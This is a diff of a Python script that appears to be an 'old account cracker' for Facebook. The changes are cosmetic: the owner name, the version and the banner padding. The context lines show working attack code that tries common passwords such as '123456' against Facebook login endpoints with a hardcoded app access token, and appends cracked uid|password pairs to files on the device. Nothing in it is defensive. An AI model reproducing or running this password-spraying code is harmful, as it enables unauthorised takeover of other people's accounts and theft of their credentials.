@@ -200,19 +200,19 @@ def ____banner____():
         print(CYAN + "║" + line.center(width) + "║")
 
     print(CYAN + "║" + " "*width + "║")
-    print(CYAN + "║"+ "ASIM ALI 👿  ".center(49) + "║" + RESET)
+    print(CYAN + "║"+ "H A C K E R 👿  ".center(49) + "║" + RESET)
     print(CYAN + "╚" + "═"*width + "╝" + RESET)
     # 🔥 INFO PANEL (NEW STYLE)
     print(CYAN + "╔══════════════════════════════════════╗" + RESET)
-    print(GREEN + "║            TOOL INFO PANEL          ║" + RESET)
+    print(GREEN + "║            TOOL INFO PANEL           ║" + RESET)
     print(CYAN + "╚══════════════════════════════════════╝" + RESET)
     # USER NAME INPUT   
-    print(f"{CYAN}➢ Tool Owner : {BLINK}ASIM ALI{RESET}")
-    print(f"{CYAN}➢ Version    : {PURPLE}1.0{RESET}")
+    print(f"{CYAN}➢ Tool Owner : {BLINK}SHANI MALIK{RESET}")
+    print(f"{CYAN}➢ Version    : {PURPLE}4.0{RESET}")
     print(f"{CYAN}➢ Device Key : {CYAN}{user_key if user_key else 'LOADING...'}{RESET}")
     print(f"{CYAN}➢ Expiry     : {GREEN}{exp if exp else 'N/A'}{RESET}")
     print(f"{CYAN}➢ Time Left  : {GREEN}{left if left else 'N/A'}{RESET}")
-    print(CYAN + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" + RESET)
+    print(CYAN + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" + RESET)
 if __name__ == "__main__":
     ____banner____()
 def creationyear(uid):
@@ -300,10 +300,10 @@ def old_clone():
     print("\033[1;32m╔══════════════════════════════════╗\033[0m")
     print("\033[1;32m║  OLD ACCOUNT CRACKER             ║\033[0m")
     print("\033[1;32m╠══════════════════════════════════╣\033[0m")
-    print("\033[1;32m║ [1] CRACK ALL ACCOUNTS          ║\033[0m")
-    print("\033[1;32m║ [2] 100004 / 100004             ║\033[0m")
-    print("\033[1;32m║ [3] CRACK 2009-2010 ACCOUNTS    ║\033[0m")
-    print("\033[1;32m║ [0] BACK TO MAIN MENU           ║\033[0m")
+    print("\033[1;32m║ [1] CRACK ALL ACCOUNTS           ║\033[0m")
+    print("\033[1;32m║ [2] 100004 / 100004              ║\033[0m")
+    print("\033[1;32m║ [3] CRACK 2009-2010 ACCOUNTS     ║\033[0m")
+    print("\033[1;32m║ [0] BACK TO MAIN MENU            ║\033[0m")
     print("\033[1;32m╚══════════════════════════════════╝\033[0m")
     _input = choice = input(f"\x1b[38;5;196m➤\x1b[1;37m CHOICE {W}:{Y} \x1b[38;5;46m➤➤\x1b[0m ")
     if _input in ('1', 'a', '01', '1'):
@@ -577,13 +577,13 @@ def login_1(uid):
             }
             res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
             if 'session_key' in res:
-                print(f"\r\033[1;31m[\033[30mASIM\033[1;31m] \033[1;32m{uid} \033[1;37m|\033[1;91m {pw}\033[0m")
-                open('/sdcard/ASIM-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                print(f"\r\033[1;31m[\033[30mSHANI\033[1;31m] \033[1;32m{uid} \033[1;37m|\033[1;91m {pw}\033[0m")
+                open('/sdcard/SHANI-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
             elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
-                print(f"\r\033[1;31m[\033[30mASIM\033[1;31m] \033[1;36m\033[1;32m{uid} \033[1;37m\033[30m{pw}\033[0m")
-                open('/sdcard/ASIM-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                print(f"\r\033[1;31m[\033[30mSHANI\033[1;31m] \033[1;36m\033[1;32m{uid} \033[1;37m\033[30m{pw}\033[0m")
+                open('/sdcard/SHANI-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
         loop += 1
@@ -595,7 +595,7 @@ def login_2(uid):
     """
     Login attempt method 2.
     """
-    sys.stdout.write(f"\r\r\x1b[38;5;46m[ASIM]\x1b[0m\x1b[38;5;196m({loop})\x1b[0m\x1b[38;5;46m(OK)\x1b[0m\x1b[38;5;46m({len(oks)})\x1b[0m")
+    sys.stdout.write(f"\r\r\x1b[38;5;46m[SHANI]\x1b[0m\x1b[38;5;196m({loop})\x1b[0m\x1b[38;5;46m(OK)\x1b[0m\x1b[38;5;46m({len(oks)})\x1b[0m")
     
     for pw in ('123456', '1234567', '12345678', '123456789'):
         try:
@@ -613,13 +613,13 @@ def login_2(uid):
                 url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                 po = session.get(url, headers=headers).json()
                 if 'session_key' in po:
-                    print(f"\r\033[1;31m[\033[30mASIM\033[1;31m] \033[1;32m{uid} \033[1;37m|\033[1;91m {pw}\033[0m")
-                    open('/sdcard/ASIM-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    print(f"\r\033[1;31m[\033[30mSHANI\033[1;31m] \033[1;32m{uid} \033[1;37m|\033[1;91m {pw}\033[0m")
+                    open('/sdcard/SHANI-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                     oks.append(uid)
                     break
                 elif 'session_key' in po:
-                    print(f"\r\033[1;31m[\033[30mASIM\033[1;31m] \033[1;36m\033[1;32m{uid} \033[1;37m\033[30m{pw}\033[0m")
-                    open('/sdcard/ASIM-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    print(f"\r\033[1;31m[\033[30mSHANI\033[1;31m] \033[1;36m\033[1;32m{uid} \033[1;37m\033[30m{pw}\033[0m")
+                    open('/sdcard/SHANI-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
                 loop+=1
